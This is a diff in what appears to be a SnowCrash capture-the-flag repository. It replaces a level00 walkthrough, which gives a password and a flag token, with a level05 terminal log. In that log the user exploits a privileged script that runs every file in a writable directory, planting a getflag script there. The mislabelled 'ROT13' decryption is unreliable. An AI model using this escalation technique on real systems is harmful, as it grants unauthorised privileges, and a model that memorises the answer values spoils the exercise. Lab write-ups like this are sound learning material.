@@ -1,40 +1,17 @@
-# Resources for level05
+level05@SnowCrash:/rofs/usr/sbin$ find / -user flag05 2>/dev/null
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+level05@SnowCrash:/rofs/usr/sbin$ cat /usr/sbin/openarenaserver
 
-## Walkthrough to capture the flag:
+#!/bin/sh
 
-### Step 1: Find files owned by user `flag00`
-```bash
-find / -user flag00 2>/dev/null
-```
-> Output:
-```
-/usr/sbin/john
-/rofs/usr/sbin/john
-```
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
 
-### Step 2: Read the encrypted string
-```bash
-cat /rofs/usr/sbin/john
-```
-> Output:
-```
-cdiiddwpgswtgt
-```
 
-### Step 3: Decrypt it (likely ROT13)
-Decrypted password: `nottoohardhere`
-
-### Step 4: Switch to `flag00` user
-```bash
-su flag00
-# enter password: nottoohardhere
-```
-
-### Step 5: Get the flag
-```bash
-getflag
-```
-> Output:
-```
-Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
-```
+level05@SnowCrash:/rofs/usr/sbin$ echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
+level05@SnowCrash:/rofs/usr/sbin$ chmod +x /opt/openarenaserver/script.sh
+level05@SnowCrash:/rofs/usr/sbin$ ls /opt/openarenaserver/script.sh
+/opt/openarenaserver/script.sh
